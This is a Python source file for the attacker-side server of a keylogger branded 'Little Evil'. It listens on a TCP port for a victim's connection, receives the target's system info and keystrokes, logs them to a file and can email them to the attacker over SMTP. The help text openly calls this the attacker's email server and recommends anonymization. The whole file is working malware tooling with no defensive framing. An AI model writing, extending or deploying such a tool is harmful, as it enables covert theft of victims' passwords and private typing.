from ssl import create_default_context
from threading import Thread, Event
from argparse import ArgumentParser
from smtplib import SMTP_SSL
from time import sleep
from sys import stdout
import socket

spinner_event = Event()

reset_ascii_color = "\x1b[0m"
dark_red = "\x1b[31;2m"
red = "\x1b[1;31m"
green = "\x1b[1;38;5;46m"
yellow_bold = "\x1b[1;38;5;226m"

parser = ArgumentParser(
    description="Keystroke logging tool in Python3",
    epilog="Example: <IP Address> ./app.py -f/--file [file_name] -P/--port [port] -m/--email [Email Server]"
    )    
parser.add_argument("ip", type=str, metavar="<IP Address>", help="IP Address (Anonymization on the server is recommended)")
parser.add_argument('-e', "--email", type=str, metavar="", help="Send the data to the attacker's email server")
parser.add_argument('-f', "--file", type=str, metavar="", help="Write the records to a file")
parser.add_argument('-P', "--port", type=int, default=24445, metavar="", help="Port [Default = 24445]")

args = parser.parse_args()


def logo():

    banner = "\n██╗     ██╗████████╗████████╗██╗     ███████╗    ███████╗██╗   ██╗██╗██╗\n"
    banner += "██║     ██║╚══██╔══╝╚══██╔══╝██║     ██╔════╝    ██╔════╝██║   ██║██║██║\n"
    banner += "██║     ██║   ██║      ██║   ██║     █████╗      █████╗  ██║   ██║██║██║\n"
    banner += "██║     ██║   ██║      ██║   ██║     ██╔══╝      ██╔══╝  ╚██╗ ██╔╝██║██║\n"
    banner += "███████╗██║   ██║      ██║   ███████╗███████╗    ███████╗ ╚████╔╝ ██║███████╗\n"
    banner += "╚══════╝╚═╝   ╚═╝      ╚═╝   ╚══════╝╚══════╝    ╚══════╝  ╚═══╝  ╚═╝╚══════╝\n"

    description = "----------------------------->[] Keylogger tool []<-----------------------------\n\n".center(80)

    return f"{dark_red}{banner}{reset_ascii_color}" + description


def start_server():
    
    context = create_default_context()
    
    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind((args.ip, args.port))
        server.listen(100)
        conn, addr = server.accept()
    
    except KeyboardInterrupt:
        server.close()
        return f"\n[{red}X{reset_ascii_color}] Cancelled\n"

    spinner_event.set()
    stdout.flush()

    stdout.write(f"\r{green}[✓]{reset_ascii_color} Connected with: {addr}\n")
    stdout.flush()

    print(receiving_keys(conn))
    conn.close()


def spinner():
    
    while not spinner_event.is_set():
        for char in "/-\|":
            stdout.write(f"\r[{yellow_bold}{char}{reset_ascii_color}] Waiting for connections... ")
            stdout.flush()
            sleep(0.1)


def receiving_info(conn):
    
    file_option = (29*"=") + f">{yellow_bold} File created! Writing.... {reset_ascii_color}<" + (29*"=") + "\n"
    email_option = (30*"=") + f">{yellow_bold} Email option selected! {reset_ascii_color}<" + (31*"=") + "\n"
    get_digits = (30*"=") + f">{yellow_bold} Getting Keyboard Digits {reset_ascii_color}<" + (30*"=") + "\n"

    try:
        info = conn.recv(1024)

        if info:
            print(f"\n\n[{yellow_bold}!Target Info!{reset_ascii_color}]: {info.decode()}\n")
            
            if args.file is not None and args.email is not None:
                print(file_option)
                return email_option

            elif args.file is not None and args.email is None:
                return file_option
            
            elif args.file is None and args.email is not None:
                return email_option
            else:
                pass
        
            return get_digits

        else:
            return f"\n[{red}X{reset_ascii_color}] Connection closed by client!\n"

    except KeyboardInterrupt:
        return f"\n[{red}X{reset_ascii_color}] Cancelled\n"   
            
    except Exception as e:
        return f"\n[{red}X{reset_ascii_color}] Error: {str(e)}\n"


def receiving_keys(conn):

    data = ""

    print(receiving_info(conn))

    try:    
        while True:

            logs = conn.recv(1024)

            if logs:
                write_file(logs.decode())

                if args.email is not None:
                    data += f"{logs.decode() + ' '}\n"
                else:
                    pass

                print(f"\n[{yellow_bold}!{reset_ascii_color}] Digits: {logs.decode()}")
            else:
                print(send_email(data))
                return f"\n[{red}X{reset_ascii_color}] Connection closed by client!\n"


    except KeyboardInterrupt:
        print(send_email(data))
        return f"\n[{red}X{reset_ascii_color}] Connection closed!\n"
    
    except ConnectionResetError:
        print(send_email(data))
        return f"\n[{red}X{reset_ascii_color}] Connection closed by client!\n"

    except Exception as e:
        return f"\n[{red}X{reset_ascii_color}] Error: {str(e)}\n"


def send_email(data):
    
    if args.email is not None:
        context = create_default_context()
        mail_server = SMTP_SSL(args.email, 465, context=context)

        print("\n" + "==" * 30)
        mail_type = input(f"{yellow_bold}[?]{reset_ascii_color} Insert your Email address: ")
        print("==" * 30)
        password_type = input(f"{yellow_bold}[?]{reset_ascii_color} Insert your Password: ")
        print("==" * 30 + "\n")
        
        try:
            mail_server.login(user=mail_type, password=password_type)

            print("-" * 40)
            print(f"{green}[..]{reset_ascii_color} SENDING THE EMAIL")
            print("-" * 40 + "\n")

            mail_server.sendmail(from_addr=mail_type, to_addrs=mail_type, msg=data.encode('utf-8'))
            mail_server.quit()
            
            return f"{green}[✓]{reset_ascii_color} E-MAIL SENT"
        
        except KeyboardInterrupt:
            return f"\n[{red}X{reset_ascii_color}] Cancelled\n"

        except Exception as e:
            return f"\n[{red}X{reset_ascii_color}] Error: {str(e)}\n"
    else:
        pass


def write_file(logs):

    file_name = args.file

    if file_name is not None:
        try:
            with open(file_name, "at") as file:
                file.write(logs + "\n")

        except Exception:
            file.close()
    else:
        pass
            

def main():

    print(logo())
    spinner_thread = Thread(target=spinner)
    spinner_thread.daemon = True
    spinner_thread.start()

    start_server()

    try:
        spinner_thread.join()

    except KeyboardInterrupt:
        return f"\n[{red}X{reset_ascii_color}] Cancelled\n"

    return f"\n{green}[✓]{reset_ascii_color} Finished!\n"


if __name__ == '__main__':
    
    print(main())
    